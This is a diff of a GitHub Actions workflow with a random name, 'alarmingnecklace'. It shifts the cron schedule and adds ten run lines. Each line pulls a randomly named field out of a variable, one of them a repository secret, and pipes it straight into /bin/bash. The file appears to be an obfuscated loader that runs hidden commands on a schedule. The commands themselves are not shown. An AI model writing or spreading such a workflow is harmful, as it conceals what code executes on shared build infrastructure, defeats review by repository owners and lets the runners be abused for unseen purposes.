@@ -1,22 +1,27 @@
 name: alarmingnecklace
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '47 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: alarmingnecklace
         env:
-          jdig61842: ${{ secrets.jdig61842 }}
+          i2: ${{ secrets.i2 }}
         run: |
-          echo $jdig61842 | jq -r .vcj547 | /bin/bash
-          echo $vxkmo201 | jq -r .imw673 | /bin/bash
-          echo $tvvi3368 | jq -r .smx1 | /bin/bash
-          echo $m39512 | jq -r .chcze6825 | /bin/bash
-          echo $nggb58576 | jq -r .ahyqi9595 | /bin/bash
+          echo $i2 | jq -r .kbqco8 | /bin/bash
+          echo $mdl0 | jq -r .jgow00745 | /bin/bash
+          echo $evdks7867 | jq -r .xr766 | /bin/bash
+          echo $yiw5 | jq -r .b13 | /bin/bash
+          echo $uvnu0 | jq -r .x9 | /bin/bash
+          echo $tiaeh1213 | jq -r .etbq53 | /bin/bash
+          echo $lzub312 | jq -r .v65 | /bin/bash
+          echo $owyx93 | jq -r .xusy112 | /bin/bash
+          echo $mz8 | jq -r .npabn35 | /bin/bash
+          echo $vi545 | jq -r .d1 | /bin/bash
 
